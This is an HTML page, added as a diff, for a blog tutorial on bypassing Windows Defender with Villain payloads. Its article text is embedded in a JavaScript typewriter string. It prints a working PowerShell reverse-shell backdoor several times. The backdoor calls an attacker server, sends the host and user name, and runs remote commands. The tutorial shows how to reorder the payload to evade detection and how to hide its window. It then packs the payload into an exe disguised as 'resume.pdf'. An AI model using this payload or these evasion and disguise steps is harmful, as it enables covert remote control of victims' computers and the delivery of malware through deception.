@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <title>Obfuscation with Villain</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="description" content="" />
+    <style>
+@import "https://fonts.googleapis.com/css2?family=Inconsolata&display=swap";:root{--cursor-visibility:hidden}html,body{width:100%;height:100%;overflow:auto;font-family:inconsolata,monospace;font-size:4vmin;line-height:4.1vmin;font-weight:400}body{margin:0;display:flex;flex-direction:row;justify-content:center;align-items:center}#content{min-width:82vmin;min-height:82vmin}::-webkit-scrollbar{width:10px}::-webkit-scrollbar-track{border-radius:10px;box-shadow:inset 0 0 1px white}::-webkit-scrollbar-thumb{border-radius:10px;box-shadow:0 0 0 1px white}.cursor,#activity-title:after,#activity-content:after,#cd:after,#whoami:after,#cat:after,#tree:after{visibility:var(--cursor-visibility);content:"|";overflow:hidden;color:#fff;animation:blink 500ms linear infinite alternate}@keyframes blink{0%{opacity:0}100%{opacity:1}}@media only screen and (min-width:768px){body{font-size:2.5vmin;line-height:2.6vmin}#content{min-width:60vmin}}:root{--cursor-visibility:hidden}body{align-items:unset;overflow-y:scroll}#content{max-width:80vmin}pre{overflow-x:scroll;white-space:pre}@keyframes blink{0%{opacity:0}100%{opacity:1}}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+        
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+body{background:#1b1d1e}body #terminal{color:#BBBBBB}body #user{color:#23E298}body #dir{color:#D08010}body .Typewriter__cursor{color:#BBBBBB}a{color:#BBBBBB}
+
+        
+.navFull {
+    background-color: #353535;
+    font-family: "Courier New";
+    font-size: 17px;
+    display: inline;
+    position: fixed;
+    bottom: 0px;
+    left: 0px;
+    width: 100%;
+    padding-top: 5px;
+    padding: 10px;
+    padding-bottom: 0px;
+}
+
+.navCredits {
+    float: right;
+    padding-right: 18px;
+    padding-bottom: 10px;
+    padding-top: 5px;
+}
+
+#content::after {
+    content: "\a\a";
+    white-space: pre;
+}
+        
+        
+</style>
+
+
+
+</head><body><div id="content">
+    
+    
+    
+
+
+    <span id="activity-title"></span> <br>
+ <span id="activity-content"></span> <br>
+
+<script type="text/javascript">
+    async function typewriter(text, elementId, waitAfter) {
+        var n = 0,
+            isTag = false
+        addText = "";
+        const el = document.getElementById(elementId);
+
+        const wait = () => new Promise(r => setTimeout(r, waitAfter));
+        const nowait = () => new Promise(r => r());
+
+        const render = () => el.innerHTML = (text.slice(0, n + 1) + addText);
+
+        const cursor = document.createElement('span');
+        cursor.id = "blink";
+
+        el.style.setProperty("--cursor-visibility", "visible");
+        while (n < text.length) {
+            if (text.charAt(n + 1) === "<") isTag = true;
+            if (text.charAt(n + 1) === ">") isTag = false;
+
+            if (isTag) {
+                n++;
+                continue;
+            }
+
+            requestAnimationFrame(render);
+
+            if (waitAfter === 0) {
+                await nowait();
+            } else {
+                await wait();
+            }
+
+            n++;
+        }
+        el.style.setProperty("--cursor-visibility", "collapse");
+    }
+
+    function parseDelay(d) {
+        const parsed = parseInt(d, 10);
+        if (isNaN(parsed)) return 0;
+        return parsed;
+    }
+
+    const titleDelay = parseDelay("0"),
+        contentDelay = parseDelay("0");
+    const typeeffetct = async () => {
+        await typewriter("\u003cspan id=\u0027terminal\u0027\u003e\u003ch1 id=\u0027title\u0027\u003eObfuscation with Villain\u003c\/h1\u003e\u003c\/span\u003e", "activity-title", titleDelay);
+        await typewriter("\u003cspan id=\u0027terminal\u0027\u003e\u003cp\u003e\u003ca href=\u0022\/\u0022\u003eHome\u003c\/a\u003e\u003c\/p\u003e\n\u003ch1 style=\u0022line-height: 1.0;\u0022\u003eWindows Defender Bypass with Villain and Obfuscation (14\/12\/2022)\u003c\/h1\u003e\n\u003cbr\/\u003e\n\u003ccenter\u003e\u003cimg src=\u0022\/binaryspiders.jpg\u0022 alt=\u0022binary spiders\u0022\u003e\u003c\/center\u003e\n\u003cp align=\u0022justify\u0022\u003e\nWindows Defender is a signature based antimalware system. This means that it checks programs against a library of previously identified malware to locate malicious software. Because of this, attackers can find ways to bypass Windows Defender by either creating new payloads or encoding\/obfuscating existing payloads beyond recognition.\n\u003cp\u003e\u003cbr\/\u003e\u003cbr\/\u003e\u003c\/p\u003e\n\u003ch1 id=\u0022villain\u0022\u003eVillain\u003c\/h1\u003e\n\u003ch2 id=\u0022click-here-to-watch-it-in-actionhttpsyoutubedzu2-av6hkc\u0022\u003e\u003ca href=\u0022https:\/\/youtu.be\/Dzu2-AV6Hkc\u0022\u003eClick here to watch it in action\u003c\/a\u003e\u003c\/h2\u003e\n\u003cp\u003eNote: I\u0026rsquo;d appreciate it if you\u0026rsquo;re going to try this out, please turn off Windows Defender\u0026rsquo;s automatic sample submission.\u003c\/p\u003e\n\u003cp\u003e\u003ca href=\u0022https:\/\/github.com\/t3l3machus\/Villain\u0022\u003eVillain\u003c\/a\u003e by t3l3machus is an evolved version of his previous project \u003ca href=\u0022https:\/\/github.com\/t3l3machus\/hoaxshell\u0022\u003eHoaxShell\u003c\/a\u003e. HoaxShell managed to avoid detection for a period of time because it used http traffic for communication between the host and the remote computer and it creates a unique payload for every use by generating random values for session IDs. This means that every payload is single use only.\u003c\/p\u003e\n\u003cp\u003eVillain inherits the way HoaxShell works but changes the implementation of powershell. Compared to HoaxShell, Villain is more fully suited towards red team usage due to its capability to catch and maintain multiple reverse shell connections at the same time. It also supports obfuscation and as well as payload encoding. Much like HoaxShell, Villain\u0026rsquo;s payloads went undetected by Windows Defender for a period of time until they got fingerprinted.\u003c\/p\u003e\n\u003cbr\/\u003e\n\u003ch1 id=\u0022obfuscation\u0022\u003eObfuscation\u003c\/h1\u003e\n\u003cp\u003et3l3machus released a guide on how to manually obfuscate Villain\u0026rsquo;s payloads in his video titled \u003ca href=\u0022https:\/\/www.youtube.com\/watch?v=FVbdZSGkzhs\u0022\u003eBypass signature-based detection with Villain\u003c\/a\u003e. In the video, he explained and presented many general ways to obfuscate powershsudoell backdoors. Manual obfuscation is done using the payload generated using:\u003c\/p\u003e\n\u003cp\u003e\u003cb\u003egenerate os=windows lhost=[IP]\u003c\/b\u003e\u003c\/p\u003e\n\u003ccenter\u003e\u003cimg src=\u0022\/villainshell.png\u0022 width=\u0022130%\u0022 height=\u0022200% alt=\u0022villain payload\u0022\u003e\u003c\/center\u003e\n\u003cp\u003eThe resulting payload would look something like this:\u003c\/p\u003e\n\u003cp\u003e\u003cb\u003eStart-Process $PSHOME\\powershell.exe -ArgumentList {$s=\u0026rsquo;[Server IP]:8080\u0026rsquo;;$i=\u0026lsquo;57100f54-99fd6e91-29c7d520\u0026rsquo;;$p=\u0026lsquo;http:\/\/\u0026rsquo;;$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s\/57100f54\/$env:COMPUTERNAME\/$env:USERNAME -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s\/99fd6e91 -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i});if ($c -ne \u0026lsquo;None\u0026rsquo;) {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s\/29c7d520 -Method POST -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e\u002b$r) -join \u0026rsquo; \u0026lsquo;)} sleep 0.8}} -WindowStyle Hidden\u003c\/b\u003e\u003c\/p\u003e\n\u003cp\u003eIn his video, he managed to bypass Windows Defender by changing the position of the $p variable from the end to the start as shown:\u003c\/p\u003e\n\u003cp\u003e\u003cb\u003eStart-Process $PSHOME\\powershell.exe -ArgumentList {$p=\u0026lsquo;http:\/\/\u0026rsquo;;$s=\u0026rsquo;[Server IP]:8080\u0026rsquo;;$i=\u0026lsquo;57100f54-99fd6e91-29c7d520\u0026rsquo;;$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s\/57100f54\/$env:COMPUTERNAME\/$env:USERNAME -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s\/99fd6e91 -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i});if ($c -ne \u0026lsquo;None\u0026rsquo;) {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s\/29c7d520 -Method POST -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e\u002b$r) -join \u0026rsquo; \u0026lsquo;)} sleep 0.8}} -WindowStyle Hidden\u003c\/b\u003e\u003c\/p\u003e\n\u003cp\u003eDuring the time of writing, this powershell payload should execute without any issues.\u003c\/p\u003e\n\u003cp\u003eI noticed that t3l3machus added \u0026ldquo;Start-Process\u0026rdquo; and \u0026ldquo;-WindowStyle Hidden\u0026rdquo; to run the payload in the background. However, this does not close the powershell window if one opened. We are able to start the process as a job using \u0026ldquo;Start-Job -ScriptBlock\u0026rdquo;. And then, we can concatenate \u0026ldquo;PowerShell -WindowStyle hidden ;\u0026rdquo; to the end of the script to close the powershell window totally:\u003c\/p\u003e\n\u003cp\u003e\u003cb\u003eStart-Job -ScriptBlock{Start-Process $PSHOME\\powershell.exe -ArgumentList {$p=\u0026lsquo;http:\/\/\u0026rsquo;;$s=\u0026rsquo;[Server IP]:8080\u0026rsquo;;$i=\u0026lsquo;57100f54-99fd6e91-29c7d520\u0026rsquo;;$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s\/57100f54\/$env:COMPUTERNAME\/$env:USERNAME -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s\/99fd6e91 -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i});if ($c -ne \u0026lsquo;None\u0026rsquo;) {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s\/29c7d520 -Method POST -Headers @{\u0026ldquo;Authorization\u0026rdquo;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e\u002b$r) -join \u0026rsquo; \u0026lsquo;)} sleep 0.8}} -WindowStyle Hidden}; PowerShell -WindowStyle hidden ; \u003c\/b\u003e\u003c\/p\u003e\n\u003cp\u003eFinally, we can package the ps1 script into an exe for a less suspicious look using the \u003ca href=\u0022https:\/\/github.com\/MScholtes\/PS2EXE\u0022\u003eps2exe\u003c\/a\u003e powershell tool:\u003c\/p\u003e\n\u003cp\u003e\u003cb\u003eps2exe .\\source.ps1 .\\target.exe\u003c\/b\u003e\u003c\/p\u003e\n\u003cp\u003eWe can make the executable less suspicious by spoofing its icons and extension to mimic something less suspicious like a pdf.\u003c\/p\u003e\n\u003ccenter\u003e\u003cimg src=\u0022\/fakeresume.png\u0022 width=\u002230%\u0022 height=\u002230% alt=\u0022resume exe\u0022\u003e\u003c\/center\u003e\n\u003cp\u003eI did this using \u003ca href=\u0022https:\/\/github.com\/AHXR\/maskedkitty\u0022\u003emaskedkitty\u003c\/a\u003e by \u003ca href=\u0022https:\/\/github.com\/AHXR\u0022\u003eAXHR\u003c\/a\u003e. I named the file \u0026ldquo;resume.pdf\u0026rdquo;. The full name of the file with the file extension included would be \u0026ldquo;resume.pdf.exe\u0026rdquo; so its not 100% convincing.\u003c\/p\u003e\n\u003cp\u003eWith this, we have finished the creation of our payload. I expect this method of obfuscation with Villain\u0026rsquo;s payloads to be fingerprinted and detected by Windows Defender sometime in the future but I hope everyone can enjoy this method while it lasts (legally of course).\u003c\/p\u003e\n\u003c\/p\u003e\u003c\/span\u003e", "activity-content", contentDelay);
+        return;
+    }
+
+    typeeffetct()
+</script>
+
+        </div>
+        
+        
+        
+         
+    </body>
+</html>
